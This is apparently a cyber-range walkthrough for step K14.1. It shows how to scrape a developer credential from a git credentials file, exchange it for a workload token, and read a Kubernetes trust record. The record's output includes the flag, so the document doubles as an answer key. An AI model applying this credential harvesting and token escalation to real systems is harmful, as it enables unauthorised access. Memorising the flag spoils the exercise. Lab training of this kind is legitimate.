# K14.1 Walkthrough: Read the trust record

Precondition: the K13.4 workload token (`$WORKLOAD`).

## Step 0: open a participant shell

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Step 1: get the workload token

```
CA=~/.local/share/keplerops/ca.crt
DEV=$(sed -E 's#https://([^@]+)@.*#\1#' ~/.config/git/credentials)
WORKLOAD=$(curl -sS --cacert $CA -u "$DEV" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

## Step 2: read the trust record (K14.1 acceptance check)

The trust record is a real K3s ConfigMap. cloud-api reads it with the workload
token. The developer token alone returns 401.

```
curl -sS --cacert $CA -H "Authorization: Bearer $WORKLOAD" \
  https://cloud-api.keplerops.test/api/trust-records/TRUST-FLX-04
```

Output:

```json
{"accepted_audiences":"[\"https://kubernetes.default.svc.cluster.local\",\"k3s\"]","export_role":"fieldkest-export-access","flag":"FLAG{418e19c3ed0c13ef}","issuer":"https://kubernetes.default.svc.cluster.local","schema":"fieldkest.trust-record/v1","service_ref":"fieldkest-exports","subject":"system:serviceaccount:fieldlink:svc-fieldlink-workload","trust_id":"TRUST-FLX-04"}
```

The record names the export role (`fieldkest-export-access`), which is the K14.2
scope.
